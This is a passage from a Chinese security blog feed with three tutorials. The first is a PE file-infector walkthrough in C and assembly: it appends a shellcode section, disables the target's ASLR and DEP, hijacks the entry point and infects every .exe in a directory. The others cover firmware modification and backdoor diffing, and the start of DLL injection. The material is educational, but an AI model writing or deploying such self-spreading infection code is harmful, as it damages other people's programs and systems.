<p>IsPeFile() 和 IsInfected() 函数的实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">检查是否为正常PE文件</div><div class="line">*/</div><div class="line"><span class="function">BOOL <span class="title">IsPeFile</span><span class="params">(PVOID pHdr)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="comment">//判断DOS头标志是否正确</span></div><div class="line">	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;</div><div class="line">	<span class="keyword">if</span> (p1-&gt;e_magic != IMAGE_DOS_SIGNATURE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//判断PE头标志是否正确</span></div><div class="line">	IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1-&gt;e_lfanew);</div><div class="line">	<span class="keyword">if</span> (p2-&gt;Signature != IMAGE_NT_SIGNATURE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">判断文件是否被感染</div><div class="line">*/</div><div class="line"><span class="function">BOOL <span class="title">IsInfected</span><span class="params">(PVOID pHdr)</span></span></div><div class="line">&#123;</div><div class="line">	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;</div><div class="line">	<span class="comment">//判断DOS头的保留位是否已被填充为 0xABCD</span></div><div class="line">	<span class="keyword">if</span> ( p-&gt;e_res2[<span class="number">0</span>] == (WORD)INFECTFLAG)&#123;</div><div class="line">		<span class="keyword">return</span> TRUE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		p-&gt;e_res2[<span class="number">0</span>] = (WORD)INFECTFLAG;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="3）添加节表"><a href="#3）添加节表" class="headerlink" title="3）添加节表"></a><strong>3）添加节表</strong></h4><p>添加一个节区需要在 PE 文件中添加一个节表，此外还需修改 NumberOfSections 和 SizeOfImage 字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//PE头指针： 文件头指针+DOS头的e_lfanew位指定的PE头偏移</span></div><div class="line">	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)-&gt;e_lfanew);</div><div class="line">	<span class="comment">//节区头指针： PE头指针+PE头的长度</span></div><div class="line">	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</div><div class="line"></div><div class="line">	<span class="comment">//两个对齐单位</span></div><div class="line">	DWORD dwFileAlign = pNTHdr-&gt;OptionalHeader.FileAlignment;</div><div class="line">	DWORD dwSecAlign  = pNTHdr-&gt;OptionalHeader.SectionAlignment;</div><div class="line">	<span class="comment">//最后一个节指针</span></div><div class="line">	IMAGE_SECTION_HEADER *pLastSec = &amp;pSecHdr[pNTHdr-&gt;FileHeader.NumberOfSections<span class="number">-1</span>];</div><div class="line">	<span class="comment">//定义一个新节</span></div><div class="line">	IMAGE_SECTION_HEADER *pNewSec = &amp;pSecHdr[pNTHdr-&gt;FileHeader.NumberOfSections];</div><div class="line">	<span class="comment">//原入口地址（OEP）</span></div><div class="line">	DWORD dwOldOEP = pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint + pNTHdr-&gt;OptionalHeader.ImageBase;</div><div class="line">	<span class="comment">//需插入的代码长度</span></div><div class="line">	DWORD dwCodeSize  = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;</div><div class="line"></div><div class="line">	<span class="comment">//填充新节表的各字段</span></div><div class="line">	<span class="built_in">memcpy</span>(pNewSec-&gt;Name,<span class="string">".new"</span>,<span class="number">5</span>);</div><div class="line">	pNewSec-&gt;Misc.VirtualSize = dwCodeSize;</div><div class="line">	pNewSec-&gt;VirtualAddress		=	pLastSec-&gt;VirtualAddress + Align(pLastSec-&gt;Misc.VirtualSize, dwSecAlign);</div><div class="line">	pNewSec-&gt;SizeOfRawData		=	Align(dwCodeSize,dwFileAlign);</div><div class="line">	pNewSec-&gt;PointerToRawData	=	pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;</div><div class="line">	pNewSec-&gt;Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;</div><div class="line"></div><div class="line">	<span class="comment">//节区数目加 1</span></div><div class="line">	pNTHdr-&gt;FileHeader.NumberOfSections++;</div><div class="line">	<span class="comment">//修正PE镜像大小</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.SizeOfImage += Align(pNewSec-&gt;Misc.VirtualSize,dwSecAlign);</div><div class="line"> 	...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>VS2010 中默认设置时，计算 Shellcode 长度时无法正确获取函数在内存中的地址，需要将修改项目属性：配置属性/链接器/常规/关闭增量链接。</p>
<h4 id="4）插入节区数据"><a href="#4）插入节区数据" class="headerlink" title="4）插入节区数据"></a><strong>4）插入节区数据</strong></h4><p>病毒通常会将带有恶意行为的代码插入新节区的数据段，被插入的代码称为 Shellcode，这里只是插入一段弹消息框的代码，Shellcode 通常使用汇编实现，下面是内联汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">void __declspec(naked) ShellcodeStart()</div><div class="line">&#123;</div><div class="line">	__asm &#123;</div><div class="line">			pushad</div><div class="line">			call    routine</div><div class="line"></div><div class="line">	routine :</div><div class="line">			pop     ebp</div><div class="line">			sub      ebp, offset routine</div><div class="line">			push    0                                // MB_OK</div><div class="line">			lea       eax, [ebp + szCaption]</div><div class="line">			push    eax                              // lpCaption</div><div class="line">			lea	   eax, [ebp + szText]</div><div class="line">			push    eax                              // lpText</div><div class="line">			push    0                                // hWnd</div><div class="line">			mov     eax, 0xAAAAAAAA</div><div class="line">			call      eax                            // MessageBoxA</div><div class="line"></div><div class="line">			popad</div><div class="line">			push    0xBBBBBBBB                       // OEP</div><div class="line">			ret</div><div class="line"></div><div class="line">	szCaption :</div><div class="line">			db(&apos;V&apos;) db(&apos;i&apos;) db(&apos;r&apos;) db(&apos;u&apos;) db(&apos;s&apos;) db(0)</div><div class="line">	szText :</div><div class="line">			db(&apos;I&apos;) db(&apos;n&apos;) db(&apos;f&apos;) db(&apos;l&apos;) db(&apos;e&apos;) db(&apos;c&apos;) db(&apos;t&apos;) db(&apos; &apos;) db(&apos;s&apos;)</div><div class="line">			db(&apos;u&apos;) db(&apos;c&apos;) db(&apos;c&apos;) db(&apos;e&apos;) db(&apos;s&apos;) db(&apos;s&apos;) db(&apos; &apos;) db(&apos;!&apos;) db(0)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从以上代码可知，Shellcode 执行完后会 ret 到原入口地址（OEP）处继续执行。Shellcode 中 MessageBoxA 函数的地址和 OEP 只是占位符，需要在运行时修正这两个地址。</p>
<p>大多数程序都会加载 user32.dll， 并且在同一系统中，user32.dll 会被加载到自身固有的 ImageBase，而 MessageBoxA 是该动态链接库的一个导出函数，所以同一系统中运行的所有进程的 MessageBoxA 函数地址是相同的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//动态获取 MessageBoxA 函数地址</span></div><div class="line">	HMODULE hModule = LoadLibraryA(<span class="string">"user32.dll"</span>);</div><div class="line">	LPVOID lpAddress = GetProcAddress(hModule, <span class="string">"MessageBoxA"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//修改 shellcode 中 MessabeBoxA 和 OEP 的地址</span></div><div class="line">	HANDLE hHeap = HeapCreate(<span class="literal">NULL</span>,<span class="literal">NULL</span>,dwCodeSize);</div><div class="line">	LPVOID lpHeap = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwCodeSize);</div><div class="line">	<span class="built_in">memcpy</span>(lpHeap,ShellcodeStart,dwCodeSize);</div><div class="line"></div><div class="line">	DWORD dwIncrementor = <span class="number">0</span>;</div><div class="line">	<span class="keyword">for</span>(;dwIncrementor &lt; dwCodeSize; dwIncrementor++)&#123;</div><div class="line">		<span class="comment">//修改 MessageBoxA 地址</span></div><div class="line">		<span class="keyword">if</span>(*((LPDWORD)lpHeap + dwIncrementor) == <span class="number">0xAAAAAAAA</span>)&#123;</div><div class="line">			*((LPDWORD)lpHeap +dwIncrementor) = (DWORD)lpAddress;</div><div class="line">		&#125;</div><div class="line">		<span class="comment">//修改原 OEP 地址</span></div><div class="line">		<span class="keyword">if</span>(*((LPDWORD)lpHeap + dwIncrementor) == <span class="number">0xBBBBBBBB</span>)&#123;</div><div class="line">			*((LPDWORD)lpHeap +dwIncrementor) = dwOldOEP;</div><div class="line">			FreeLibrary(hModule);</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//复制shellcode到新节区</span></div><div class="line">	DWORD dwSize = <span class="number">0</span>;</div><div class="line">	SetFilePointer(hFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FILE_END);</div><div class="line">	WriteFile(hFile,lpHeap,pNewSec-&gt;SizeOfRawData,&amp;dwSize,<span class="literal">NULL</span>);</div><div class="line">	HeapFree(hHeap,<span class="literal">NULL</span>,lpHeap);</div><div class="line">	HeapDestroy(hHeap);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>修正 Shellcode 中地址之后将其复制到 PE 文件的末尾，首先使用 SetFilePointer() 函数将文件指针指向文件末尾，再通过 WriteFile() 函数将 Shellcode 函数写入文件。SetFilePointer() 函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">DWORD WINAPI <span class="title">SetFilePointer</span><span class="params">(</span></span></div><div class="line">	HANDLE hFile, <span class="comment">//A handle to the file</span></div><div class="line"> 	LONG   lDistanceToMove,</div><div class="line"> 	PLONG  lpDistanceToMoveHigh,</div><div class="line"> 	DWORD  dwMoveMethod <span class="comment">//The starting point for the file pointer move</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<h4 id="5）关闭目标程序-ASLR"><a href="#5）关闭目标程序-ASLR" class="headerlink" title="5）关闭目标程序 ASLR"></a><strong>5）关闭目标程序 ASLR</strong></h4><p>由于 Shellcode 中 MessageBoxA() 函数地址和原 OEP 都是硬编码的，而在 Windows Vista 系统开始都默认启用 ASLR，所以目标程序每次启动时加载到内存的地址(ImageBase)都不同，导致 Shellcode 在跳转至原入口地址时因地址错误而不能正常执行。</p>
<p>普通的 EXE 文件不存在 .reloc 节区，编译器默认情况下都启用 ASLR（“目属性/链接器/高级/随机基址” 可关闭 ASLR），所以编译生成的可执行文件会包含用于重定位的 .reloc 节区。PE 文件中与 ASLR 相关的字段主要有以下几个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IMAGE_FILE_HEADER/Characteristics：关闭 ASLR 时才设置 IMAGE_FILE_RELOCS_STRIPPED 属性值    </div><div class="line">IMAGE_OPTIONAL_HEADER/DllCharacteristics：开启 ASLR 时才设置 IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 属性值</div><div class="line">IMAGE_OPTIONAL_HEADER/DataDirectory[5]：该字段为 Base Relocation Table，ASLR 关闭时该字段值为 0。</div></pre></td></tr></table></figure></p>
<p>下面通过编程的方式关闭目标程序的 ASLR：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//关闭目标程序 ASLR</span></div><div class="line">	pNTHdr-&gt;FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress = <span class="number">0</span>;</div><div class="line">	pNTHdr-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].Size = <span class="number">0</span>;</div><div class="line"> 	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>注：<br>IMAGE_OPTIONAL_HEADER/DllCharacteristics 中 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 为与 DEP 相关的属性值，开启 DEP 时会设置改属性值，同样可以用以下代码关闭目标程序的 DEP：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pNTHdr-&gt;OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;</div></pre></td></tr></table></figure></p>
<h4 id="6）修改入口地址-OEP"><a href="#6）修改入口地址-OEP" class="headerlink" title="6）修改入口地址 OEP"></a><strong>6）修改入口地址 OEP</strong></h4><p>为了让新添加节区中的代码获得优先执行权，要把程序的入口地址设置为新节区的起始地址，即新节表中 VirtualAddress 的值。修改完后调用 FlushViewOfFile() 函数将对文件的修改写入到磁盘中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line"> 	...</div><div class="line">	<span class="comment">//设置新增节区起始地址为新的入口地址</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint = pNewSec-&gt;VirtualAddress;</div><div class="line"></div><div class="line">	FlushViewOfFile(pHdr,pNTHdr-&gt;OptionalHeader.SizeOfHeaders);</div><div class="line">	UnmapViewOfFile(pHdr);</div><div class="line">	CloseHandle(hMapFile);</div><div class="line">	CloseHandle(hFile);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="6）测试"><a href="#6）测试" class="headerlink" title="6）测试"></a><strong>6）测试</strong></h4><p>以下代码遍历当前目录下所有.exe 文件，并感染除程序自身外的所有.exe文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	WIN32_FIND_DATA FileInfo;</div><div class="line">	HANDLE hListFile;</div><div class="line">	TCHAR szFilePath[MAX_PATH];</div><div class="line">	TCHAR szCurrentPath[MAX_PATH];</div><div class="line">	TCHAR szCurrentModule[MAX_PATH];</div><div class="line"></div><div class="line">	<span class="comment">//获取当前目录</span></div><div class="line">	GetCurrentDirectory(MAX_PATH,szCurrentPath);</div><div class="line">	<span class="comment">//获取当前模块路径</span></div><div class="line">	GetModuleFileName(<span class="literal">NULL</span>,szCurrentModule,MAX_PATH);</div><div class="line">	lstrcpy(szFilePath,szCurrentPath);</div><div class="line">	lstrcat(szFilePath,<span class="string">L"\\*.exe"</span>);</div><div class="line"></div><div class="line">	<span class="comment">//遍历当前目录并感染除自身外的所有.exe文件</span></div><div class="line">	hListFile = FindFirstFile(szFilePath,&amp;FileInfo);</div><div class="line">	<span class="keyword">if</span>(hListFile == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">do</span>&#123;</div><div class="line">			<span class="keyword">if</span>(!_tcsstr(szCurrentModule,FileInfo.cFileName))&#123;</div><div class="line">				<span class="comment">//感染目标文件</span></div><div class="line">				<span class="keyword">if</span> (!InfectFile(FileInfo.cFileName))&#123;</div><div class="line">					<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;<span class="keyword">while</span>(FindNextFile(hListFile,&amp;FileInfo));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行被感染后的文件，会弹出以下消息框，使用 PEview 可以看到添加了一个名为 .new 的节区。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-23/33815689.jpg" alt=""></p>
<p>完整代码可以在 <a href="https://github.com/0x4C43/InflectPE" target="_blank" rel="external">此链接</a> 下载。</p>
<hr>
<p>References:<br>[1] <a href="https://0x00sec.org/t/pe-file-infection/401" target="_blank" rel="external">PE File Infection</a><br>[2] 《小小黑客之路》<br>[3] 《黑客编辑揭秘与防范》<br>[4] 《逆向工程核心原理》</p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PE文件 </tag>
            
            <tag> 添加节区 </tag>
            
            <tag> 病毒感染 </tag>
            
            <tag> 打补丁 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 firmware-mod-kit 修改固件]]></title>
      <url>/%E4%BD%BF%E7%94%A8firmware-mod-kit%E4%BF%AE%E6%94%B9%E5%9B%BA%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p>firmware-mod-kit 工具包可用于提取固件中的文件系统，然后对其进行修改，并重新打包成固件。我们可以使用它对固件做定制化的修改，但是也有可能被恶意地用于在固件中添加后门等，所以在下载固件时应到官方网站下载，并检查固件是否被修改过。</p>
<p>该工具包支持以下固件：</p>
<blockquote>
<p>DD-WRT v23    tested - versions v23 SP1 and later are compatible (soon older versions too).<br>DD-WRT v24    tested<br>OpenWrt White Russian    tested<br>OpenWrt Kamikaze    untested (should work) - not really necessary, based on OpenWrt has its Image Builder.<br>FreeWrt    untested - should work ok<br>HyperWrt    untested<br>Ewrt    untested<br>Sveasoft Alchemy    untested<br>Sveasoft Talisman    untested<br>Linksys / other vendor    not supported by scripts yet - haven’t added cramfs handling<br>ASUS WL-330G    untested - should work ok<br>ASUS WL-520G    untested - should work ok<br>ASUS WL-530G    supported<br>ASUS WL-550G    untested  - should work ok<br>Trendnet TEW-632BRP    tested<br>DLink DIR-615    untested<br>many others*    untested</p>
</blockquote>
<h3 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a><strong>0x01 安装</strong></h3><p>可在 <a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="external">google code</a> 下载    Firmware Mod Kit v0.99 安装包，然后解压安装，安装前需要先安装相应的依赖库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">For Ubuntu: $ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</div><div class="line"></div><div class="line">cd firmware-mod-kit/src</div><div class="line">./configure &amp;&amp; make</div></pre></td></tr></table></figure></p>
<h3 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a><strong>0x02 使用</strong></h3><p>firmware-mod-kit 中包含以下几个工具脚本：</p>
<blockquote>
<p>extract-firmware.sh：解包固件<br>build-firmware.sh：重新打包固件<br>check_for_upgrade.sh：检查更新<br>unsquashfs_all.sh：解包提取出来的 squashfs 文件</p>
</blockquote>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/78163658.jpg" alt=""></p>
<h4 id="1）-解包固件"><a href="#1）-解包固件" class="headerlink" title="1） 解包固件"></a><strong>1）</strong> 解包固件</h4><p>使用以下命令解包固件，firmware.bin 为需解包的固件，working_directory 为解包结果存储位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./extract_firmware.sh firmware.bin working_directory/</div></pre></td></tr></table></figure></p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/6411506.jpg" alt=""></p>
<h4 id="2）重新打包固件"><a href="#2）重新打包固件" class="headerlink" title="2）重新打包固件"></a><strong>2）重新打包固件</strong></h4><p>修改完解包后的文件系统后，使用 build_firmware.sh 重新打包固件，新生成的固件将存在 output_directory 目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./build_firmware.sh output_directory/ working_directory/</div></pre></td></tr></table></figure></p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/10177238.jpg" alt=""></p>
<h3 id="0x03-Directory-Tree-Diff-amp-amp-Fuzzy-Hashing"><a href="#0x03-Directory-Tree-Diff-amp-amp-Fuzzy-Hashing" class="headerlink" title="0x03 Directory Tree Diff &amp;&amp; Fuzzy Hashing"></a><strong>0x03 Directory Tree Diff &amp;&amp; Fuzzy Hashing</strong></h3><p>当我们发现下载的固件是被修改过时，可以使用 <a href="https://github.com/bmaia/binwally" target="_blank" rel="external">binwally</a> 将修改过的固件与<a href="https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">原版固件</a>对比，从而发现具体修改内容。</p>
<h4 id="1-解包固件"><a href="#1-解包固件" class="headerlink" title="1) 解包固件"></a><strong>1) 解包固件</strong></h4><p>可以看到固件编译日期为 2007-02-03，而文件系统的创建实际为 2017-06-05,说明固件中的文件系统被修改过。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/63948070.jpg" alt=""></p>
<h4 id="2）差异对比"><a href="#2）差异对比" class="headerlink" title="2）差异对比"></a><strong>2）差异对比</strong></h4><p>google 查找发现 openwrt-wrtsl54gs-squashfs.bin 固件有三个版本，分别为：</p>
<blockquote>
<p><a href="https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/default/openwrt-wrtsl54gs-squashfs.bin</a><br> <a href="https://downloads.openwrt.org/whiterussian/0.9/micro/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/micro/openwrt-wrtsl54gs-squashfs.bin</a><br> <a href="https://downloads.openwrt.org/whiterussian/0.9/pptp/openwrt-wrtsl54gs-squashfs.bin" target="_blank" rel="external">https://downloads.openwrt.org/whiterussian/0.9/pptp/openwrt-wrtsl54gs-squashfs.bin</a></p>
</blockquote>
<p>使用 binwally 对比结果显示”default” 版本的相似性最高，可知，目标固件是 “default” 版本固件的修改版。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/59066778.jpg" alt=""><br>继续查看具体修改的文件为 /etc/profile 和 /bin/nc。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-6-5/31504566.jpg" alt=""></p>
<hr>
<p>References：<br>[1] <a href="https://code.google.com/archive/p/firmware-mod-kit/wikis/Documentation.wiki" target="_blank" rel="external">firmware-mod-kit - Documentation.wiki</a><br>[2] <a href="https://bitsum.com/firmware_mod_kit.htm" target="_blank" rel="external">Firmware Modification Kit</a><br>[3] <a href="http://blog.csdn.net/qq1084283172/article/details/68061957" target="_blank" rel="external">路由器逆向分析——firmware-mod-kit工具安装和使用说明</a><br>[4] <a href="https://w00tsec.blogspot.com/2015/02/firmware-forensics-diffs-timelines-elfs.html" target="_blank" rel="external">Firmware Forensics: Diffs, Timelines, ELFs and Backdoors</a></p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> firmware-mod-kit </tag>
            
            <tag> firmware </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DLL 注入之远程线程注入]]></title>
      <url>/DLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>在 Windows 中有多种方法实现 DLL 注入，<a href="http://0x4c43.cn/DLL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/">可以使用消息钩子注入 DLL</a>，但是通过消息钩子的方法可控性差，不能准确的注入到指定的进程中。而使用远程线程注入的方法可以实现准确地在指定时刻将 DLL 注入到指定的进程中，其可控性较好。</p>
<h3 id="0x01-注入原理"><a href="#0x01-注入原理" class="headerlink" title="0x01 注入原理"></a><strong>0x01 注入原理</strong></h3><p>使用 Windows 远程线程机制，在本地进程中通过 CreateRemoteThread 函数在其他进程中开启并运行一个线程。CreateRemoteThread 函数原型如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HANDLE WINAPI CreateRemoteThread (</div><div class="line">	HANDLE                  hProcess,	// 远程进程句柄</div><div class="line">	LPSECURITY_ATTRIBUTES  	lpThreadAttributes,	// 线程的安全属性</div><div class="line">	SIZE_T                  dwStackSize,		// 线程栈的大小</div><div class="line">	LPTHREAD_START_ROUTINE	lpStartAddress,  // 线程入口函数的起始地址</div><div class="line">	LPVOID                  lpParameter, 		// 传递给线程函数的参数</div><div class="line">	DWORD                   dwCreationFlags,	// 线程是否立即启动</div><div class="line">	LPDWORD                 lpThreadId		// 用于保存内核分配给线程的ID</div><div class="line">)；</div></pre></td></tr></table></figure></p>
<p>主要关注三个参数：hProcess、lpStartAddress 和 lpParameter。hProcess 是要执行线程的目标进程句柄；lpStartAddress 是线程函数的起始地址，且该函数必须位于目标进程内；lpParameter 是传递给线程函数的参数。</p>
